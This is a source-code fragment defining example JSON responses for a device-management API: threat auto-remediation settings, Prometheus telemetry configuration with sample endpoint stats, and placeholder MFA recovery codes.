const threatSettingsExample = `{"auto_remediation": {"enabled": true, "after_days": 2, "restart_mode": "if_required", "restart_warn_minutes": 15, "overdue_alerts": true}, "editable": true}`

const telemetryExample = `{
	"settings": {
		"metrics": {"enabled": true, "interval_seconds": 15, "collectors": [], "group_ids": []},
		"remote_write": {"enabled": true, "url": "http://prometheus.example.internal:9090/api/v1/write", "username": "", "secret_set": false},
		"scrape": {"enabled": false},
		"labels": {"job": "mustra", "extra": {"site": "hq"}, "groups": [{"group_id": "cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3", "labels": {"device_class": "laptop"}}], "proxmox_guests": true}
	},
	"collectors": ["cpu", "memory", "load", "filesystem", "diskstats", "netdev", "stat", "uname", "time", "hwmon", "filefd"],
	"endpoints": [
		{"agent_id": "agt-0123456789abcdef0123456789abcdef", "hostname": "web01", "os": "linux", "received": "2026-10-27T14:02:11Z", "series": 412},
		{"agent_id": "agt-fedcba9876543210fedcba9876543210", "hostname": "ca01", "os": "windows", "received": "2026-10-27T14:02:05Z", "series": 96}
	],
	"stats": {"batches_received": 5760, "batches_sent": 5758, "batches_dropped": 0, "series_sent": 1460212, "last_sent_at": "2026-10-27T14:02:13Z"},
	"scrape_path": "/metrics/endpoints"
}`

// mfaRecoveryCodesExample is ten recovery codes, each shown only once.
const mfaRecoveryCodesExample = `{"recovery_codes": ["<code-1>", "<code-2>", "<code-3>", "<code-4>", "<code-5>", "<code-6>", "<code-7>", "<code-8>", "<code-9>", "<code-10>"]}`
